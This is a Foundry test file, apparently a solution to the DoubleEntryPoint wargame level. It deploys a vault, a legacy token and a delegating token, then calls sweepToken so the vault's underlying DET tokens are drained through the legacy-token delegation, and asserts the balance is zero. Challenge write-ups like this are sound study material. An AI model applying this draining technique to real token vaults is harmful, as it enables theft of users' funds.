// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./DoubleEntryPoint.sol";
import "./CryptoVault.sol";
import "./Forta.sol";
import "./LegacyToken.sol";

contract ExploitDET is Test {
    DoubleEntryPoint det;
    CryptoVault vault;
    LegacyToken lgt;
    Forta forta;

    address owner = makeAddr("owner");
    address recipient = makeAddr("recipient");
    address player = makeAddr("player");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        lgt = new LegacyToken();
        vault = new CryptoVault(recipient);
        forta = new Forta();
        det = new DoubleEntryPoint(
            address(lgt),
            address(vault),
            address(forta),
            player
        );
        lgt.mint(address(vault), 100e18);
        lgt.delegateToNewContract(det);

        vault.setUnderlying(address(det));

        vm.stopPrank();
    }
    function testDraisLGTwithoutDelegatge() public {
        //Remove Delegation
        vm.prank(owner);
        lgt.delegateToNewContract(DoubleEntryPoint(address(0)));
        vault.sweepToken(lgt);

        uint256 vaultBalance = lgt.balanceOf(address(vault));

        assertEq(vaultBalance, 0);
    }

    function testDrainsDETWithDelegate() public {
        //Already delegated at setUp
        vault.sweepToken(lgt);

        uint256 vaultBalance = det.balanceOf(address(vault));

        assertEq(vaultBalance, 0);
    }
}
